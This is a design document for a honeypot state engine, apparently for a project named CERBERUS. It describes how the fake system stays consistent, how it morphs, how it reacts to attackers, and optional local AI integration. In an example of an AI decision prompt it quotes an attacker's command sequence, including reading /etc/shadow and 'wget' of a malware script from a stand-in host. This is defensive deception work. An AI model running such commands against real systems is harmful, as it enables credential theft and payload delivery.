# CERBERUS State Engine Architecture

## The Rubik's Cube Vision

The CERBERUS honeypot needs to be like a Rubik's cube - every time you look at it, it's different, but it's always internally consistent. This document describes how we achieve that.

---

## The Problem with Static Fake Data

### Current Approach (Bad)
```
┌─────────────────────────────────────────────────────────────┐
│  Shell Script generates random files at startup             │
│                                                             │
│  /proc/uptime  → random: 45 days                           │
│  /var/log/messages → random: entries from 2 days ago       │
│  /proc/meminfo → random: 50 processes worth of memory      │
│  ps output → random: 12 processes                          │
│                                                             │
│  RESULT: Nothing correlates! Attacker notices immediately  │
└─────────────────────────────────────────────────────────────┘
```

**Why this fails:**
- Uptime says 45 days, but logs only go back 2 days
- Memory shows 50 processes worth, but `ps` shows 12
- Timestamps don't align with boot time
- Attacker runs `cat /proc/uptime && cat /var/log/messages` and sees the inconsistency

---

## The Solution: Single Source of Truth

### New Approach (Good)
```
┌─────────────────────────────────────────────────────────────┐
│                    SYSTEM STATE (The Truth)                 │
│                                                             │
│  boot_time: Oct 15, 2025 10:30:00                          │
│  uptime: 45 days (derived from boot_time)                  │
│  processes: [init, dropbear, httpd, ...] (12 total)        │
│  memory_per_process: [500KB, 2MB, 1MB, ...]                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                 OUTPUT GENERATORS                           │
│                                                             │
│  /proc/uptime  → calculate from boot_time                  │
│  /var/log/messages → generate entries spanning 45 days     │
│  /proc/meminfo → sum of all process memory                 │
│  ps output → list from processes array                     │
│                                                             │
│  RESULT: Everything correlates automatically!              │
└─────────────────────────────────────────────────────────────┘
```

---

## State Engine Components

### 1. System State Structure

```c
typedef struct {
    // === IDENTITY ===
    device_profile_t profile;     // What device we're pretending to be
    char hostname[64];
    
    // === TIME (Everything derives from these!) ===
    time_t boot_time;             // When the "system" booted
    uint32_t uptime_seconds;      // Calculated: now - boot_time
    
    // === ENTITIES ===
    process_t processes[128];     // Fake processes
    int process_count;
    
    user_t users[32];             // Fake users
    int user_count;
    
    file_t files[512];            // Tracked files
    int file_count;
    
    interface_t interfaces[8];    // Network interfaces
    int interface_count;
    
    // === DERIVED VALUES (calculated from above) ===
    uint32_t total_memory_kb;
    uint32_t used_memory_kb;
    float load_average[3];
    
} system_state_t;
```

### 2. Correlation Rules

The key insight: **derived values are CALCULATED, not random**.

```
RULE: Memory Usage
    used_memory = SUM(process.memory_kb for each process)
    
RULE: Load Average  
    load = COUNT(processes where state == RUNNING) / cpu_cores
    
RULE: Log Timestamps
    FOR each log entry:
        timestamp MUST be >= boot_time
        timestamp MUST be <= now
        timestamps MUST be in chronological order
        
RULE: File Timestamps
    file.mtime <= now
    file.mtime >= boot_time (for files created after boot)
    file.atime >= file.mtime (accessed after modified)
    
RULE: Process Start Times
    process.start_time >= boot_time
    process.start_time <= now
    parent.start_time <= child.start_time
```

### 3. Output Generators

Each "file" that attackers can read is generated on-demand from state:

```c
int generate_proc_meminfo(system_state_t* state, char* buf, size_t size) {
    // Calculate from state - NOT random!
    uint32_t used = 0;
    for (int i = 0; i < state->process_count; i++) {
        used += state->processes[i].memory_kb;
    }
    
    uint32_t total = state->profile.total_ram_kb;
    uint32_t free = total - used;
    uint32_t buffers = free * 10 / 100;  // ~10% buffers
    uint32_t cached = free * 25 / 100;   // ~25% cached
    
    snprintf(buf, size,
        "MemTotal:        %8u kB\n"
        "MemFree:         %8u kB\n"
        "Buffers:         %8u kB\n"
        "Cached:          %8u kB\n"
        ...,
        total, free, buffers, cached);
}
```

---

## Morphing: The Rubik's Cube Twist

When we morph, we don't change random values. We:

1. Generate a new random seed
2. Re-derive ALL values from that seed
3. Maintain internal consistency

```c
void state_morph(system_state_t* state, uint32_t new_seed) {
    // Save profile (identity stays same unless explicitly changed)
    device_profile_t saved_profile = state->profile;
    
    // Reset PRNG with new seed
    prng_seed(new_seed);
    
    // Generate new boot_time (1-365 days ago)
    int days_ago = rand_between(1, 365);
    state->boot_time = time(NULL) - (days_ago * 86400);
    
    // Generate new processes (but consistent with device type)
    generate_processes_for_device(state, &saved_profile);
    
    // Generate new network config
    generate_network_config(state, &saved_profile);
    
    // Recalculate ALL derived values
    state_recalculate(state);
    
    // Regenerate logs (spanning new uptime period)
    generate_logs(state, days_ago);
    
    // Result: Completely different but internally consistent!
}
```

---

## Reactive Behavior: Responding to Attackers

When an attacker does something, we update the state:

```c
// Attacker runs: touch /tmp/hack.txt
void handle_file_create(system_state_t* state, const char* path) {
    // Add to state
    file_t* f = &state->files[state->file_count++];
    strcpy(f->path, path);
    f->size = 0;
    f->mtime = time(NULL);  // Created NOW
    f->owner = state->current_session.uid;
    f->created_by_attacker = true;  // Track this!
}

// Later, attacker runs: ls /tmp
// Our ls generator includes the new file!
```

### What We Track:
- Files created/deleted by attacker
- Processes started/killed by attacker
- Commands executed (for behavioral analysis)
- Session duration and patterns

---

## AI Integration Points

### Where AI Can Help:

#### 1. Realistic Value Generation
Instead of pure random, AI suggests realistic values:

```python
# AI prompt:
"For a TP-Link Archer C7 router that has been running for 45 days,
what would be realistic values for:
- Number of DHCP leases (0-50)
- DNS queries in log (magnitude)
- Wireless clients connected
- CPU temperature"

# AI response:
{
    "dhcp_leases": 8,        # Typical home network
    "dns_queries": 15000,    # ~333/day is normal
    "wifi_clients": 5,       # Phones, laptops, TV
    "cpu_temp": 52           # Celsius, normal for router
}
```

#### 2. Log Message Generation
AI generates realistic log entries:

```python
# AI prompt:
"Generate 5 realistic syslog entries for a home router at 3 AM.
The router is a TP-Link running OpenWrt.
Include normal background activity, not attacks."

# AI response:
"Dec  2 03:00:01 router crond[1234]: (root) CMD (run-parts /etc/cron.hourly)
Dec  2 03:00:15 router dnsmasq[456]: query[A] connectivity.apple.com from 192.168.1.42
Dec  2 03:01:22 router kernel: wlan0: STA 00:11:22:33:44:55 sleep mode
Dec  2 03:15:00 router ntpd[789]: adjusting clock frequency
Dec  2 03:22:45 router dnsmasq[456]: query[AAAA] mtalk.google.com from 192.168.1.43"
```

#### 3. Behavioral Anomaly Response
AI decides how to respond to suspicious behavior:

```python
# AI prompt:
"An attacker has run these commands in order:
1. cat /etc/passwd
2. cat /etc/shadow
3. uname -a
4. wget http://evil.com/malware.sh

This looks like: [reconnaissance → privilege check → download payload]

Should we:
A) Continue normally (observe what they do)
B) Morph now (disrupt their attack)
C) Inject errors (frustrate them)
D) Slow down responses (waste their time)"

# AI decides based on:
# - Current threat level
# - Value of continued observation
# - Risk of attacker success
```

#### 4. Correlation Sanity Check
AI validates that our fake system makes sense:

```python
# AI prompt:
"Review this system state for consistency:
- Device: Home router
- Uptime: 45 days
- Processes: 47
- Memory: 128MB total, 120MB used
- Load average: 0.01
- Network: 500GB transferred

Are there any inconsistencies?"

# AI response:
"INCONSISTENCY DETECTED:
- 47 processes on a 128MB router is too many (expect 15-25)
- 500GB transferred in 45 days = 11GB/day, high for home use
- Load 0.01 with 47 processes is suspiciously low

SUGGESTED FIXES:
- Reduce processes to 18-22
- Reduce transfer to 50-100GB
- Increase load to 0.05-0.15"
```

---

## Implementation Phases

### Phase 1: Core State Engine (No AI)
- Implement `system_state_t` structure
- Implement correlation rules in C
- Implement output generators
- Implement basic morphing

### Phase 2: Reactive Behavior
- Track attacker actions
- Update state based on commands
- Integrate with Cowrie command handlers

### Phase 3: Simple AI (Rule-Based)
- Decision trees for common scenarios
- Template-based log generation
- Heuristic consistency checking

### Phase 4: Advanced AI (Optional)
- Local LLM integration (llama.cpp, Ollama)
- Learning from attacker patterns
- Autonomous morphing decisions

---

## Local AI Options

### Option 1: Ollama (Recommended)
```bash
# Install Ollama
curl -fsSL https://ollama.ai/install.sh | sh

# Run a small model locally
ollama run phi3:mini  # 3B params, runs on CPU

# Our code calls it via HTTP API
curl http://localhost:11434/api/generate -d '{
    "model": "phi3:mini",
    "prompt": "Generate realistic syslog..."
}'
```

**Pros:** Easy setup, good models, local/private
**Cons:** Needs 4-8GB RAM for small models

### Option 2: llama.cpp
```bash
# Compile llama.cpp
git clone https://github.com/ggerganov/llama.cpp
cd llama.cpp && make

# Run with a GGUF model
./main -m models/phi-3-mini.gguf -p "Generate..."
```

**Pros:** Very efficient, pure C/C++
**Cons:** More setup, manage models yourself

### Option 3: Rule-Based "AI" (No ML)
```c
// No actual AI - just smart rules
const char* generate_log_message(device_type_t type, int hour) {
    if (hour >= 2 && hour <= 5) {
        // Late night - mostly quiet
        return random_choice([
            "crond: (root) CMD (run-parts /etc/cron.hourly)",
            "ntpd: adjusting clock",
            "kernel: eth0: link is still up"
        ]);
    } else if (hour >= 8 && hour <= 18) {
        // Business hours - more activity
        return random_choice([
            "dnsmasq: query from 192.168.1.x",
            "dropbear: connection from 192.168.1.x",
            "httpd: GET /admin/status.html"
        ]);
    }
    ...
}
```

**Pros:** Fast, no dependencies, predictable
**Cons:** Less creative, needs manual rules

---

## File Structure

```
cerberus-honeypot/
├── include/
│   └── state_engine.h      # Data structures and API
│
├── src/
│   └── state/
│       ├── state_engine.c  # Core state management
│       ├── state_init.c    # Initialization routines
│       ├── state_morph.c   # Morphing logic
│       ├── state_correlate.c # Correlation rules
│       ├── state_mutate.c  # Handle attacker actions
│       └── generators/
│           ├── gen_proc.c  # /proc/* generators
│           ├── gen_etc.c   # /etc/* generators
│           ├── gen_log.c   # Log file generators
│           ├── gen_cmd.c   # Command output generators
│           └── gen_net.c   # Network info generators
│
├── ai/                     # Optional AI integration
│   ├── ai_interface.h      # Abstract AI interface
│   ├── ai_ollama.c         # Ollama integration
│   ├── ai_rules.c          # Rule-based fallback
│   └── prompts/            # AI prompt templates
│       ├── log_generation.txt
│       ├── value_suggestion.txt
│       └── consistency_check.txt
```

---

## Summary

The State Engine transforms CERBERUS from a static honeypot into a living, breathing fake system:

1. **Single Source of Truth**: One state structure, all outputs derived
2. **Correlation**: Memory matches processes, timestamps make sense
3. **Reactive**: Responds to attacker actions in real-time
4. **Morphable**: Can change everything while staying consistent
5. **AI-Ready**: Clear integration points for intelligent decision-making

The result: A honeypot where attackers can't tell it's fake because everything they check is internally consistent.

---

## Next Steps

1. Review and finalize `state_engine.h`
2. Implement core state initialization
3. Implement output generators (start with /proc/*)
4. Integrate with Cowrie's command handlers
5. Add morphing trigger points
6. (Optional) Add AI integration

---

*Document Version: 1.0*
*Last Updated: December 2025*